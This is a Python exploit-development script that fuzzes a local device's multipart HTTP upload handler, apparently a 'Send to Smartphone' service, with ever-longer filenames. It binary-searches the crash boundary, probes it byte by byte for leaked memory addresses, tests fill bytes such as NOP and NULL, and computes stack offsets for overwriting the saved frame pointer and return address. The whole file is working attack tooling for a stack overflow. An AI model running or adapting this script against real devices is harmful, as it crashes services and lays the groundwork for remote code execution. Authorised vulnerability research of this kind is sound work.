#!/usr/bin/env python3 -u -I
"""
Multipart crash boundary: binary search + fine-grained probe.

Goals:
  1. Find exact crash boundary (binary search)
  2. Probe crash-50 to crash in 1-byte steps
  3. Look for response anomalies (different status, extra data, leaked addresses)
  4. Probe with different fill bytes at the boundary
"""

import socket
import struct
import time
import json
import os
import sys
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = 'wlp5s0'
HTTP_TARGET = '192.168.0.1'
HTTP_PORT = 80
EVIDENCE_DIR = str(_LDN_ROOT / 'evidence' / 'exploit_dev')


def build_multipart_request(filename_len, fill_byte=0x41):
    filename = bytes([fill_byte]) * filename_len
    boundary = b'----TestBoundary9876'
    body = (b'------TestBoundary9876\r\n'
            b'Content-Disposition: form-data; name="file"; filename="'
            + filename + b'"\r\n'
            b'Content-Type: application/octet-stream\r\n\r\n'
            b'TESTDATA\r\n'
            b'------TestBoundary9876--\r\n')
    req = (b'POST / HTTP/1.1\r\n'
           b'Host: 192.168.0.1\r\n'
           b'Content-Type: multipart/form-data; boundary=----TestBoundary9876\r\n'
           b'Content-Length: ' + str(len(body)).encode() + b'\r\n'
           b'\r\n' + body)
    return req


def send_multipart(filename_len, fill_byte=0x41, timeout=5):
    req = build_multipart_request(filename_len, fill_byte)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
        s.connect((HTTP_TARGET, HTTP_PORT))
        t0 = time.monotonic()
        s.sendall(req)
        resp = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        elapsed = time.monotonic() - t0
        s.close()
        return resp, None, elapsed
    except Exception as e:
        return b'', str(e), 0


def check_http(timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
        s.connect((HTTP_TARGET, HTTP_PORT))
        s.sendall(b'GET /data.json HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        resp = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return b'200 OK' in resp
    except Exception:
        return False


def wait_for_http(max_wait=200):
    t0 = time.monotonic()
    for _ in range(max_wait * 2):
        time.sleep(0.5)
        if check_http(timeout=2):
            return round(time.monotonic() - t0, 1)
    return None


def scan_for_addresses(data):
    findings = []
    if not data or len(data) < 8:
        return findings
    for i in range(len(data) - 7):
        val = struct.unpack_from('<Q', data, i)[0]
        if 0x0000007100000000 <= val <= 0x000000710FFFFFFF:
            findings.append(('CODE', i, val))
        elif 0x0000007F00000000 <= val <= 0x0000007FFFFFFFFF:
            findings.append(('STACK', i, val))
        elif 0x0000007000000000 <= val <= 0x000000700FFFFFFF:
            findings.append(('HEAP', i, val))
    return findings


def test_size(size, fill_byte=0x41, label=''):
    """Send multipart with given filename size. Return result dict."""
    resp, err, elapsed = send_multipart(size, fill_byte)
    time.sleep(0.3)
    alive = check_http()

    status_line = ''
    body = b''
    if resp:
        lines = resp.split(b'\r\n')
        status_line = lines[0].decode(errors='replace') if lines else ''
        if b'\r\n\r\n' in resp:
            body = resp.split(b'\r\n\r\n', 1)[1]

    addrs = scan_for_addresses(resp)

    return {
        'size': size,
        'fill': hex(fill_byte),
        'label': label,
        'status_line': status_line,
        'resp_len': len(resp),
        'body_len': len(body),
        'alive': alive,
        'addresses': addrs,
        'elapsed': round(elapsed, 3),
        'error': err,
        'resp_hex': resp[:500].hex() if resp else '',
    }


def main():
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    if not check_http():
        print("HTTP down. Start Send to Smartphone.")
        sys.exit(1)

    print("=" * 64)
    print("  MULTIPART CRASH BOUNDARY PROBE")
    print("=" * 64)
    print()

    all_results = []

    # Phase 1: Get baseline response
    print("[Phase 1] Baseline")
    baseline = test_size(100, label='baseline')
    print(f"  100B: {baseline['status_line']} ({baseline['resp_len']}B)")
    all_results.append(baseline)

    if not baseline['alive']:
        print("  Crashed on baseline! Aborting.")
        sys.exit(1)

    baseline_status = baseline['status_line']
    baseline_len = baseline['resp_len']
    print()

    # Phase 2: Binary search for crash boundary
    print("[Phase 2] Binary search for crash boundary")
    lo, hi = 3850, 4000  # narrowed from prior runs
    while hi - lo > 1:
        mid = (lo + hi) // 2
        print(f"  Testing {mid}B... ", end='', flush=True)
        r = test_size(mid, label='bsearch')
        all_results.append(r)

        if r['alive']:
            print(f"alive")
            lo = mid
        else:
            print(f"CRASH")
            hi = mid
            rec = wait_for_http(max_wait=180)
            if rec is None:
                print(f"    No recovery. Aborting.")
                break
            print(f"    Recovered in {rec}s")

    crash_boundary = hi
    print(f"\n  Crash boundary: {crash_boundary}B")
    print(f"  Last safe: {lo}B")
    print()

    # Phase 3: Fine probe around boundary
    scan_start = max(lo - 20, crash_boundary - 50)
    scan_end = crash_boundary + 5
    print(f"[Phase 3] Fine probe {scan_start}-{scan_end} (1-byte steps)")
    print(f"  Looking for response anomalies near boundary")
    print()

    for size in range(scan_start, scan_end + 1):
        if not check_http():
            rec = wait_for_http(max_wait=180)
            if rec is None:
                print(f"  ** No recovery — stopping")
                break

        print(f"  Testing {size}B... ", end='', flush=True)
        r = test_size(size, label='fine')
        all_results.append(r)

        markers = []
        if not r['alive']:
            markers.append('CRASH')
        if r['resp_len'] != baseline_len and r['resp_len'] > 0:
            markers.append(f'RESP_SIZE={r["resp_len"]}B (baseline={baseline_len})')
        if r['status_line'] != baseline_status and r['status_line']:
            markers.append(f'STATUS: {r["status_line"]}')
        if r['addresses']:
            markers.append(f'{len(r["addresses"])} ADDRESSES!')
            for kind, off, val in r['addresses'][:3]:
                markers.append(f'  {kind}@{off}: 0x{val:016x}')
        if r['elapsed'] > 1.0:
            markers.append(f'SLOW={r["elapsed"]:.1f}s')

        mark_str = ' | '.join(markers) if markers else 'OK'
        resp_info = f'{r["resp_len"]}B' if r['alive'] else '0B'
        print(f"{resp_info} [{mark_str}]")

        if not r['alive']:
            rec = wait_for_http(max_wait=180)
            if rec:
                print(f"    Recovered in {rec}s")
                r['recovery'] = rec

    # Phase 4: Different fill patterns at last safe size
    print()
    safe_fine = max(r['size'] for r in all_results
                    if r.get('alive') and r['label'] == 'fine')
    print(f"[Phase 4] Fill pattern tests at {safe_fine}B")

    for fill, name in [(0x00, 'NULL'), (0xFF, '0xFF'), (0x90, 'NOP'),
                       (0x42, 'B'), (0x61, 'a'), (0x01, '0x01')]:
        if not check_http():
            rec = wait_for_http(max_wait=180)
            if rec is None:
                break

        print(f"  fill={name}... ", end='', flush=True)
        r = test_size(safe_fine, fill_byte=fill, label=f'fill_{name}')
        all_results.append(r)

        markers = []
        if not r['alive']:
            markers.append('CRASH')
        if r['resp_len'] != baseline_len:
            markers.append(f'size={r["resp_len"]}')
        if r['addresses']:
            markers.append(f'{len(r["addresses"])} ADDRESSES!')
        mark_str = ' | '.join(markers) if markers else 'OK'
        print(f"{r['resp_len']}B [{mark_str}]")

        if not r['alive']:
            rec = wait_for_http(max_wait=180)
            if rec:
                print(f"    Recovered in {rec}s")
                r['recovery'] = rec

    # Phase 5: Try crash boundary -1 with 0x00 fill
    # NULL fill might not corrupt FP/LR the same way
    print()
    print(f"[Phase 5] Boundary-1 ({crash_boundary-1}B) with strategic fills")
    for fill, name in [(0x00, 'NULL'), (0x01, '0x01'), (0x71, '0x71')]:
        if not check_http():
            rec = wait_for_http(max_wait=180)
            if rec is None:
                break

        print(f"  {crash_boundary-1}B fill={name}... ", end='', flush=True)
        r = test_size(crash_boundary - 1, fill_byte=fill,
                      label=f'boundary-1_{name}')
        all_results.append(r)
        markers = []
        if not r['alive']:
            markers.append('CRASH')
        if r['addresses']:
            markers.append(f'{len(r["addresses"])} ADDRESSES!')
        mark_str = ' | '.join(markers) if markers else 'OK'
        print(f"{r['resp_len']}B [{mark_str}]")

        if not r['alive']:
            rec = wait_for_http(max_wait=180)
            if rec:
                print(f"    Recovered in {rec}s")
                r['recovery'] = rec

    # Save evidence
    path = f"{EVIDENCE_DIR}/multipart_boundary_{int(time.time())}.json"
    ser_results = []
    for r in all_results:
        sr = dict(r)
        sr['addresses'] = [(k, o, f'0x{v:016x}') for k, o, v in r.get('addresses', [])]
        ser_results.append(sr)
    with open(path, 'w') as f:
        json.dump({
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
            'crash_boundary': crash_boundary,
            'results': ser_results,
        }, f, indent=2)
    print(f"\nEvidence: {path}")

    # Summary
    print()
    print("=" * 64)
    print("  SUMMARY")
    print("=" * 64)
    print(f"  Crash boundary: {crash_boundary}B filename")

    anomalies = [r for r in all_results if r.get('alive') and
                 (r['resp_len'] != baseline_len or r.get('addresses'))]
    leaks = [r for r in all_results if r.get('addresses')]

    if leaks:
        print(f"  ** ADDRESS LEAKS FOUND: {len(leaks)} responses **")
        for r in leaks:
            for kind, off, val in r['addresses'][:3]:
                print(f"    size={r['size']} fill={r['fill']}: {kind}@{off}=0x{val:016x}")
    elif anomalies:
        print(f"  Response anomalies: {len(anomalies)} (different size/status)")
        for r in anomalies:
            print(f"    size={r['size']}: {r['resp_len']}B ({r['status_line']})")
    else:
        print("  No info leak found in HTTP responses")

    # Offset calculation
    print()
    print(f"  Stack frame geometry (approximate):")
    print(f"    Saved FP offset from filename start: ~{crash_boundary}B")
    print(f"    Saved LR offset from filename start: ~{crash_boundary + 8}B")
    print(f"    For 2-byte LR partial overwrite: filename = {crash_boundary + 8}B")


if __name__ == '__main__':
    main()
